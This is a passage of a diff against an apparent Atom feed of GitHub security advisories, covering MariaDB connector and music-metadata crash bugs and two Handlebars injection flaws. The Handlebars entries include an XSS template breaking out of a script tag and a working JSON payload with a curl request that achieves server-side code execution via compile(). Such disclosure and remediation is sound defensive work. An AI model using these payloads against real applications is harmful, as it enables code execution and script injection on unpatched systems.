-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.3.4">https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.3.4</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.4.7">https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.4.7</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.5.4">https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.5.4</a></li>
-<li><a href="https://jira.mariadb.org/browse/CONJS-367">https://jira.mariadb.org/browse/CONJS-367</a></li>
-<li><a href="https://github.com/advisories/GHSA-48qf-xh34-q73r">https://github.com/advisories/GHSA-48qf-xh34-q73r</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-48qf-xh34-q73r</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-10-08T19:42:11.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[mariadb] MariaDB Connector/Node.js: Uncaught exception crashes the client during ed25519 authentication with zero-configuration TLS]]></title>
-        <id>https://github.com/advisories/GHSA-cx2f-j9fh-8g68</id>
-        <link href="https://github.com/advisories/GHSA-cx2f-j9fh-8g68"/>
-        <updated>2026-10-08T19:42:05.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="description">Description</h3>
-<p>On the zero-configuration TLS path, the connector accepts a self-signed server certificate at the TLS level and then validates the server's identity from the fingerprint hash the server appends to the final OK_Packet (<code>Authentication.validateFingerPrint</code>). That validation calls <code>hash()</code> on the authentication plugin in use to obtain the password-derived secret both sides combine with the seed and the certificate fingerprint.</p>
-<p><code>Ed25519PasswordAuth.hash()</code> referenced an identifier <code>seed</code> that was not in scope: it was neither a parameter of the method nor a module-scope binding, existing only as a parameter of the unrelated static <code>encryptPassword(password, seed)</code>. Invoking the method therefore threw <code>ReferenceError: seed is not defined</code>.</p>
-<p>The throw happens synchronously inside the socket <code>data</code> handler, and no frame between <code>PacketInputStream.onData()</code> and the plugin guards it, so the error escapes as an uncaught exception rather than surfacing as a connection error.</p>
-<p>Because the fingerprint hash is what a legitimate MariaDB server sends on this path, ed25519 authentication with zero-configuration TLS never completed successfully — the failure is not limited to a hostile server.</p>
-<h3 id="impact">Impact</h3>
-<p>Denial of service against the client process. Under Node's default <code>uncaughtException</code> behaviour the process exits, so a long-running service is terminated rather than seeing a failed connection attempt. No credential is disclosed and no data is altered; the impact is availability only.</p>
-<p>An unauthenticated attacker able to intercept the connection (a MitM presenting a self-signed certificate, or a compromised server) can trigger the crash at will, since the self-signed-certificate path is precisely what such an attacker exercises and the rogue server only has to answer the ed25519 challenge with an OK_Packet carrying a <code>0x01</code>-prefixed validation hash.</p>
-<p>Exposure requires all of the following: a MariaDB server reached over TCP (not a unix socket), <code>ssl: true</code> or an <code>ssl</code> object without <code>rejectUnauthorized: false</code>, a password set, no <code>ssl.ca</code> provided, and <code>client_ed25519</code> as the negotiated authentication plugin. Other authentication plugins are unaffected, as is any configuration where the server certificate is verified against a provided CA.</p>
-<h3 id="resolution">Resolution</h3>
-<p><code>Ed25519PasswordAuth.hash()</code> now returns the Ed25519 public key derived from the password scalar, which is the value the server combines into the fingerprint hash, and the derivation is covered by unit and integration tests.</p>
-<p>Fixed in 3.5.4. The 3.3.x and 3.4.x maintenance branches are not patched; upgrade to 3.5.4 or later.</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>Provide the server certificate to the client (<code>ssl: { ca: ... }</code>) so standard certificate validation is used instead of fingerprint validation, or set <code>ssl: { rejectUnauthorized: false }</code> to opt into trust mode, or use an authentication plugin other than <code>client_ed25519</code>, until upgraded.</p>
-<h3 id="credit">Credit</h3>
-<p>Reported by fg0x0.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/security/advisories/GHSA-cx2f-j9fh-8g68">https://github.com/mariadb-corporation/mariadb-connector-nodejs/security/advisories/GHSA-cx2f-j9fh-8g68</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/784ca3d757194a05f202d84b0c762321e76a7915">https://github.com/mariadb-corporation/mariadb-connector-nodejs/commit/784ca3d757194a05f202d84b0c762321e76a7915</a></li>
-<li><a href="https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.5.4">https://github.com/mariadb-corporation/mariadb-connector-nodejs/releases/tag/3.5.4</a></li>
-<li><a href="https://jira.mariadb.org/browse/CONJS-356">https://jira.mariadb.org/browse/CONJS-356</a></li>
-<li><a href="https://github.com/advisories/GHSA-cx2f-j9fh-8g68">https://github.com/advisories/GHSA-cx2f-j9fh-8g68</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-cx2f-j9fh-8g68</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-10-08T19:42:04.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[music-metadata] music-metadata: uncatchable process crash parsing a crafted `.dsf` (residual of GHSA-v6c2-xwv6-8xf7)]]></title>
-        <id>https://github.com/advisories/GHSA-8j4c-6x6g-rq3j</id>
-        <link href="https://github.com/advisories/GHSA-8j4c-6x6g-rq3j"/>
-        <updated>2026-10-08T19:40:46.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p><code>DsfParser.parseChunks</code> skips an unrecognised chunk's payload with an <strong>un-awaited</strong> call:</p>
-<pre><code class="language-js">this.tokenizer.ignore(Number(chunkHeader.size) - ChunkHeader.len);   // lib/dsf/DsfParser.js:51 — no await
-</code></pre>
-<p><code>ChunkHeader.len</code> is 12. A crafted <code>.dsf</code> chunk with <code>id != 'fmt '</code> and <code>size</code> in <code>0..11</code> makes the
-argument negative; strtok3 (≥ 10.3.5) throws <code>RangeError</code> on a negative <code>ignore</code>. Because the call
-is fire-and-forget, the rejection is <strong>detached from the <code>parseBuffer()</code> promise chain</strong> → unhandled
-rejection → Node's default (≥ 15) <strong>crashes the process</strong> — <strong>after</strong> <code>parseBuffer()</code> already
-resolved, so a caller's <code>try/catch</code> catches nothing and is still taken down.</p>
-<p>Residual of GHSA-v6c2-xwv6-8xf7: the ASF site was fixed in 11.12.3 (size validation) and strtok3
-now throws on negative <code>ignore</code>; the DSF site was never validated, and its missing <code>await</code>
-escalates that throw into an <strong>uncatchable</strong> crash.</p>
-<h2 id="root-cause-libdsfdsfparserjs34-56">Root cause (<code>lib/dsf/DsfParser.js:34-56</code>)</h2>
-<pre><code class="language-js">while (bytesRemaining &gt;= ChunkHeader.len) {               // ChunkHeader.len = 12
-  const chunkHeader = await this.tokenizer.readToken(ChunkHeader);   // { id, size }
-  switch (chunkHeader.id) {
-    case 'fmt ': { ...; return; }
-    default: this.tokenizer.ignore(Number(chunkHeader.size) - ChunkHeader.len); break;  // size&lt;12 -&gt; negative, no await
-  }
-  bytesRemaining -= chunkHeader.size;
-}
-</code></pre>
-<p>strtok3 <code>AbstractTokenizer.ignore</code> (L78-79): <code>if (length &lt; 0) throw new RangeError('ignore length must be ≥ 0 bytes');</code></p>
-<h2 id="steps-to-reproduce">Steps to reproduce</h2>
-<p><code>repro/</code> — public API only, Node's default unhandled-rejection mode, <code>try/catch</code> around the parse:</p>
-<pre><code>npm install &amp;&amp; node poc.mjs
-</code></pre>
-<p>Confirmed on 11.14.0:</p>
-<pre><code>[app] parseBuffer() RESOLVED — the caller saw no error to catch.
-RangeError: ignore length must be ≥ 0 bytes
-    at DsfParser.parseChunks (.../lib/dsf/DsfParser.js:51)
-   &lt;process exits non-zero — the "process survived" line never prints&gt;
-</code></pre>
-<h2 id="impact">Impact</h2>
-<p>DoS: a single crafted <code>.dsf</code> (or any file with the <code>DSD </code> magic) crashes the Node process of any
-app parsing untrusted audio with music-metadata (2.2M weekly downloads). The crash bypasses the
-caller's error handling, so even apps that correctly <code>try/catch</code> per-file parsing are killed — one
-malicious upload can take down a shared server/worker.</p>
-<h2 id="remediation">Remediation</h2>
-<p>Add <code>await</code> on line 51 (makes the <code>RangeError</code> a catchable parse error), and validate
-<code>chunkHeader.size &gt;= ChunkHeader.len</code> before the skip (as the ASF fix did; also guards the loop
-counter). Audit other parsers for un-awaited <code>tokenizer.ignore()</code>/<code>readToken()</code>.</p>
-<h2 id="scope--honesty">Scope / honesty</h2>
-<p>Requires the DSF path (a <code>DSD </code>-magic file — normal auto-detection). Relies on Node's default
-unhandled-rejection mode (<code>throw</code>, default since Node 15); the point is that the standard defensive
-per-parse <code>try/catch</code> does not protect against it. Crash (availability), not disclosure/RCE.
-Negatives confirmed alongside: ASF infinite loop fixed; negative-<code>ignore</code> infinite-loop class
-closed at strtok3; unbounded allocation bounded by strtok3's read bound-check.</p>
-<h2 id="credits">Credits</h2>
-<p>Issue also reported by @ryu7eroo</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/Borewit/music-metadata/security/advisories/GHSA-8j4c-6x6g-rq3j">https://github.com/Borewit/music-metadata/security/advisories/GHSA-8j4c-6x6g-rq3j</a></li>
-<li><a href="https://github.com/Borewit/music-metadata/pull/2700">https://github.com/Borewit/music-metadata/pull/2700</a></li>
-<li><a href="https://github.com/Borewit/music-metadata/commit/e7fc27a96e789d41ece41fdac590fc7618274a41">https://github.com/Borewit/music-metadata/commit/e7fc27a96e789d41ece41fdac590fc7618274a41</a></li>
-<li><a href="https://github.com/Borewit/music-metadata/releases/tag/v11.15.0">https://github.com/Borewit/music-metadata/releases/tag/v11.15.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-8j4c-6x6g-rq3j">https://github.com/advisories/GHSA-8j4c-6x6g-rq3j</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-8j4c-6x6g-rq3j</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-10-08T19:40:45.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[handlebars] Handlebars: JavaScript Injection via Unsafe Inline Embedding of Precompiled Templates]]></title>
-        <id>https://github.com/advisories/GHSA-xw65-4hp5-5hc7</id>
-        <link href="https://github.com/advisories/GHSA-xw65-4hp5-5hc7"/>
-        <updated>2026-10-08T17:52:39.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p><code>Handlebars.precompile()</code> generates JavaScript source that is commonly embedded in browser <code>&lt;script&gt;</code> elements. Before the fix, static template text containing <code>&lt;/script&gt;</code> was emitted unchanged. HTML parsers recognize <code>&lt;/script&gt;</code> even inside a JavaScript string literal, closing the surrounding script element and allowing following attacker-controlled markup to be parsed and executed.</p>
-<p>This affects applications that precompile attacker-controlled templates and embed the generated source directly in an HTML <code>&lt;script&gt;</code> element. It does not affect ordinary server-side rendering or precompiled templates delivered as external JavaScript files.</p>
-<h2 id="details">Details</h2>
-<p>Static text is serialized by <code>quotedString()</code> in <code>lib/handlebars/compiler/code-gen.js</code>. The generated JavaScript is valid, but JavaScript quoting alone does not make it safe to embed in HTML. In HTML script data, the sequence <code>&lt;/script&gt;</code> terminates the element regardless of JavaScript string context.</p>
-<p>On affected releases, this template:</p>
-<pre><code class="language-handlebars">safe&lt;/script&gt;&lt;script&gt;alert("XSS")&lt;/script&gt;&lt;script&gt;
-</code></pre>
-<p>could produce generated source containing:</p>
-<pre><code class="language-js">return 'safe&lt;/script&gt;&lt;script&gt;alert("XSS")&lt;/script&gt;&lt;script&gt;';
-</code></pre>
-<p>When included inline in an HTML document, the first <code>&lt;/script&gt;</code> closes the script containing the precompiled template. The next <code>&lt;script&gt;</code> element is then parsed as HTML and executes.</p>
-<h2 id="proof-of-concept">Proof of Concept</h2>
-<pre><code class="language-js">const Handlebars = require('handlebars');
-
-const template = 'safe&lt;/script&gt;&lt;script&gt;alert("XSS")&lt;/script&gt;&lt;script&gt;';
-const output = Handlebars.precompile(template);
-
-console.log(output.includes('&lt;/script&gt;'));
-</code></pre>
-<p>Affected versions print <code>true</code>. Embedding <code>output</code> directly in an inline <code>&lt;script&gt;</code> element allows the injected script tag to be parsed by the browser.</p>
-<h2 id="workarounds">Workarounds</h2>
-<ul>
-<li>Do not inline precompiled output from untrusted templates into HTML documents.</li>
-<li>Serve generated precompiled templates as external JavaScript files where practical.</li>
-</ul>
-<h2 id="credits">Credits</h2>
-<p>Reported by Curly-Haired-Baboon Aka Laplas</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/handlebars-lang/handlebars.js/security/advisories/GHSA-xw65-4hp5-5hc7">https://github.com/handlebars-lang/handlebars.js/security/advisories/GHSA-xw65-4hp5-5hc7</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-106444">https://nvd.nist.gov/vuln/detail/CVE-2026-106444</a></li>
-<li><a href="https://github.com/handlebars-lang/handlebars.js/pull/2185">https://github.com/handlebars-lang/handlebars.js/pull/2185</a></li>
-<li><a href="https://github.com/handlebars-lang/handlebars.js/commit/609d1b11c833c9a3e00f56f2f34d22f425446725">https://github.com/handlebars-lang/handlebars.js/commit/609d1b11c833c9a3e00f56f2f34d22f425446725</a></li>
-<li><a href="https://github.com/handlebars-lang/handlebars.js/releases/tag/v4.7.10">https://github.com/handlebars-lang/handlebars.js/releases/tag/v4.7.10</a></li>
-<li><a href="https://github.com/advisories/GHSA-xw65-4hp5-5hc7">https://github.com/advisories/GHSA-xw65-4hp5-5hc7</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-xw65-4hp5-5hc7</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-10-08T17:52:37.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[handlebars] Handlebars: JavaScript Injection via AST Type Confusion in compile (bypass of CVE-2026-33937)]]></title>
-        <id>https://github.com/advisories/GHSA-8r5x-fm3f-whwj</id>
-        <link href="https://github.com/advisories/GHSA-8r5x-fm3f-whwj"/>
-        <updated>2026-10-08T17:52:34.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p><code>Handlebars.compile()</code> and <code>Handlebars.precompile()</code> accept a pre-parsed AST as well as a template string. Handlebars 4.7.9 added validation for such ASTs. It only checks values on <code>PathExpression</code>, <code>NumberLiteral</code> and <code>BooleanLiteral</code> nodes, and the compiler still writes several other AST values into the generated JavaScript unchecked.</p>
-<p>If an application passes an untrusted object to <code>compile()</code> or <code>precompile()</code>, such as a parsed JSON request body, that object can carry arbitrary JavaScript. With <code>compile()</code>, the code runs on the server when the template renders. With <code>precompile()</code>, it ends up in the precompiled output and runs wherever that output is loaded.</p>
-<p>Applications that only ever pass template <strong>strings</strong> are not affected.</p>
-<p>This bypasses the AST validation added in 4.7.9 for GHSA-2w6w-674q-4c4q, GHSA-xhpv-hc6g-r9c6 and GHSA-3mfm-83xf-c92r.</p>
-<h2 id="details">Details</h2>
-<p>The 4.7.9 validator runs in <code>parseWithoutProcessing()</code> and walks the whole AST. It only checks values on nodes whose <code>type</code> is <code>PathExpression</code>, <code>NumberLiteral</code> or <code>BooleanLiteral</code>. It passes over plain objects without a <code>type</code>, and over strings and other non-object values. The compiler reads these values from other places and writes them into the generated code as-is:</p>
-<table>
-<thead>
-<tr>
-<th>AST value</th>
-<th>Written into generated code as</th>
-<th>Compile options needed</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>Program.blockParams.length</code></td>
-<td><code>container.program(&lt;index&gt;, data, &lt;length&gt;)</code></td>
-<td>none (default options)</td>
-</tr>
-<tr>
-<td><code>depth</code> on a param that is not a <code>PathExpression</code>, e.g. a <code>StringLiteral</code></td>
-<td><code>depths[&lt;depth&gt;]</code></td>
-<td><code>stringParams: true</code></td>
-</tr>
-<tr>
-<td>A <code>StringLiteral.value</code> that is not a string</td>
-<td>raw JavaScript literal</td>
-<td><code>stringParams: true</code></td>
-</tr>
-<tr>
-<td>A <code>PathExpression.original</code> that is not a string</td>
-<td>raw JavaScript literal</td>
-<td><code>stringParams: true</code></td>
-</tr>
-</tbody></table>
-<p>The first row works with default options. A <code>Program</code> with <code>blockParams: { "length": "&lt;JS expression&gt;" }</code> passes validation because:</p>
-<ol>
-<li>the <code>blockParams</code> object has no <code>type</code>, so none of the type-specific checks apply, and</li>
-<li>the walker skips the string under <code>length</code> because it is not an object.</li>
-</ol>
-<p>The compiler then reads <code>program.blockParams.length</code> and writes the string directly into the template function. The <code>container.program(...)</code> call is part of the helper options object, which is built before the helper is looked up. The code therefore runs on render even if the block's helper does not exist.</p>
-<h2 id="proof-of-concept">Proof of Concept</h2>
-<ol>
-<li>Start a server that compiles request input:</li>
-</ol>
-<pre><code class="language-js">import express from "express";
-import Handlebars from "handlebars";
-
-const app = express();
-app.use(express.json());
-
-app.post("/api/render", (req, res) =&gt; {
-  const template = Handlebars.compile(req.body.text); // `text` may be an object, not a string
-  res.send(template());
-});
-
-app.listen(2123);
-</code></pre>
-<ol start="2">
-<li>Save this request body as <code>poc.json</code>. <code>missingHelper</code> does not need to exist:</li>
-</ol>
-<pre><code class="language-json">{
-  "text": {
-    "type": "Program",
-    "loc": { "start": { "line": 1, "column": 0 } },
-    "body": [
-      {
-        "type": "BlockStatement",
-        "path": {
-          "type": "PathExpression", "data": false, "depth": 0,
-          "parts": ["missingHelper"], "original": "missingHelper",
-          "loc": { "start": { "line": 1, "column": 0 } }
-        },
-        "params": [],
-        "program": {
-          "type": "Program",
-          "blockParams": {
-            "length": "(()=&gt;{throw new Error('Injected code ran as uid ' + process.getuid())})()"
-          },
-          "body": [],
-          "loc": { "start": { "line": 1, "column": 0 } }
-        },
-        "openStrip": { "open": false, "close": false },
-        "inverseStrip": { "open": false, "close": false },
-        "closeStrip": { "open": false, "close": false },
-        "loc": { "start": { "line": 1, "column": 0 } }
-      }
-    ]
-  }
-}
-</code></pre>
-<ol start="3">
-<li>Send the request:</li>
-</ol>
-<pre><code class="language-sh">curl -s -X POST 'http://127.0.0.1:2123/api/render' \
-     -H 'Content-Type: application/json' --data-binary @poc.json
-</code></pre>
-<p>The server responds with HTTP 500 and an error page showing the injected code ran inside the Node.js process:</p>
-<pre><code>Error: Injected code ran as uid 1000
-</code></pre>
-<h2 id="impact">Impact</h2>
-<p>An application is affected if untrusted input can reach <code>Handlebars.compile()</code> or <code>Handlebars.precompile()</code> as an object instead of a string. A common way this happens is passing a field from a JSON request body straight to <code>compile()</code>.</p>
-<ul>
-<li><strong><code>compile()</code></strong>: arbitrary JavaScript runs in the Node.js process with the application's privileges (remote code execution).</li>
-<li><strong><code>precompile()</code></strong>: the injected code is written into the precompiled template and runs wherever that template is loaded, for example in users' browsers.</li>
-</ul>
-<h2 id="workarounds">Workarounds</h2>
-<ul>
-<li><strong>Validate input type</strong> before calling <code>Handlebars.compile()</code>: ensure the argument is always a  <code>string</code>, never a plain object or JSON-deserialized value.<pre><code class="language-javascript">if (typeof templateInput !== 'string') {
-  throw new TypeError('Template must be a string');
-}
-</code></pre>
-</li>
-<li>Use the Handlebars <strong>runtime-only</strong> build (<code>handlebars/runtime</code>) on the server if templates are  pre-compiled at build time; <code>compile()</code> will be unavailable.</li>
-</ul>
-<h2 id="credits">Credits</h2>
-<h3 id="variant-programblockparams">Variant <code>Program.blockParams</code></h3>
-<ul>
-<li><a href="https://x.com/whoareme33">Nick Mykhailyshyn - @whoareme</a></li>
-<li><a href="https://github.com/jmoritzc53">jmoritzc53 </a></li>
-<li><a href="https://github.com/bhaswanthc">bhaswanthc </a></li>
-<li><a href="https://github.com/dinhvaren">dinhvaren </a></li>
-<li><a href="https://github.com/n0tra4e">n0tra4e </a> </li>
-<li><a href="https://github.com/PellaML">PellaML</a></li>
-<li><a href="https://github.com/kustundag">kustundag</a></li>
-<li><a href="https://github.com/kagebunsher">kagebunsher</a></li>
-<li><a href="https://github.com/sanmatte">sanmatte</a></li>
-</ul>
-<h3 id="variant-booleanliteralnumberliteralvalue">Variant <code>BooleanLiteral|NumberLiteral.value</code></h3>
-<ul>
-<li><a href="https://github.com/sondt99">sondt99 </a> Thai Son Dinh from VinSOC Labs (R&amp;D)</li>
-<li><a href="https://github.com/Ahmed-Elmahgob">Ahmed-Elmahgob </a></li>
-<li><a href="https://github.com/nikolakojic-rasit">nikolakojic-rasit </a></li>
-<li><a href="https://github.com/vk-can">vk-can</a></li>
-<li><a href="https://github.com/shenhuanageshei">shenhuanageshei</a></li>
-<li><a href="https://github.com/kustundag">kustundag</a></li>
-<li><a href="https://github.com/kagebunsher">kagebunsher</a></li>
-<li><a href="https://github.com/ffasterss">ffasterss</a></li>
-</ul>
-<h3 id="variant-pathexpressiondepth">Variant <code>PathExpression.depth</code></h3>
-<ul>
-<li><a href="https://github.com/hibrian827">hibrian827</a> Team Atlanta</li>
-<li><a href="https://github.com/oss-security-shopify">oss-security-shopify</a></li>
-</ul>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/handlebars-lang/handlebars.js/security/advisories/GHSA-8r5x-fm3f-whwj">https://github.com/handlebars-lang/handlebars.js/security/advisories/GHSA-8r5x-fm3f-whwj</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-106446">https://nvd.nist.gov/vuln/detail/CVE-2026-106446</a></li>
-<li><a href="https://github.com/handlebars-lang/handlebars.js/pull/2185">https://github.com/handlebars-lang/handlebars.js/pull/2185</a></li>
-<li><a href="https://github.com/handlebars-lang/handlebars.js/commit/703fdcc5fd6cc8d1cc0c33cc19de40c467c4b8d2">https://github.com/handlebars-lang/handlebars.js/commit/703fdcc5fd6cc8d1cc0c33cc19de40c467c4b8d2</a></li>
-<li><a href="https://github.com/handlebars-lang/handlebars.js/releases/tag/v4.7.10">https://github.com/handlebars-lang/handlebars.js/releases/tag/v4.7.10</a></li>
-<li><a href="https://github.com/advisories/GHSA-8r5x-fm3f-whwj">https://github.com/advisories/GHSA-8r5x-fm3f-whwj</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-8r5x-fm3f-whwj</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2026-10-08T17:52:32.000Z</published>
     </entry>
 </feed>
